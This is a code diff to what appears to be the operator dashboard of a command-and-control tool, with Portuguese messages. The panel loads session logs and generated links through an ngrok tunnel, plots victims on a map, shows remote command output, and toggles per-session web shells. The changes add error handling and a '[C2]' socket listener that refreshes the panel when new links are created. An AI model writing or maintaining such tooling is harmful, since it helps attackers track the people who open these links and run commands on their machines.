@@ -462,20 +462,34 @@
         let logs = [], map, markers = {}, currentAudio = null;
 
         function initMap() {
-            map = L.map('main-map', { zoomControl: false, attributionControl: false }).setView([20, 0], 1);
-            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
+            try {
+                if (typeof L === 'undefined') throw new Error('Leaflet not loaded');
+                map = L.map('main-map', { zoomControl: false, attributionControl: false }).setView([20, 0], 1);
+                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
+            } catch (e) {
+                console.error('[DASHBOARD] Map initialization failed:', e);
+                document.getElementById('main-map').innerHTML = '<div style="padding:20px; text-align:center; color:red;">ERRO AO CARREGAR MAPA<br><small>Verifique sua conexão ou AdBlock</small></div>';
+                map = { setView: () => {}, removeLayer: () => {}, fitBounds: () => {} };
+            }
         }
 
         async function loadData() {
-            const [logsRes, linksRes] = await Promise.all([
-                fetch('/api/logs', { cache: 'no-store', headers: { 'ngrok-skip-browser-warning': 'true' } }), 
-                fetch('/api/links', { cache: 'no-store', headers: { 'ngrok-skip-browser-warning': 'true' } })
-            ]);
-            logs = await logsRes.json();
-            renderLinks(await linksRes.json());
-            renderSessions(logs);
-            updateMap(logs);
-            updateStats();
+            try {
+                const [logsRes, linksRes] = await Promise.all([
+                    fetch('/api/logs', { cache: 'no-store', headers: { 'ngrok-skip-browser-warning': 'true' } }), 
+                    fetch('/api/links', { cache: 'no-store', headers: { 'ngrok-skip-browser-warning': 'true' } })
+                ]);
+                
+                if (!logsRes.ok || !linksRes.ok) throw new Error('Falha na resposta da API');
+                
+                logs = await logsRes.json();
+                renderLinks(await linksRes.json());
+                renderSessions(logs);
+                updateMap(logs);
+                updateStats();
+            } catch (err) {
+                console.error('[DASHBOARD] Load error:', err);
+            }
         }
 
         function renderLinks(links) {
@@ -787,6 +801,11 @@
                 outBox.innerHTML += `<div><span style="color:#aaa;"><</span> ${data.result}</div>`;
                 outBox.scrollTop = outBox.scrollHeight;
             }
+        });
+
+        socket.on('new_link_created', (link) => {
+            console.log('[C2] Novo link recebido via socket');
+            loadData();
         });
 
         function toggleWebShell(id) {
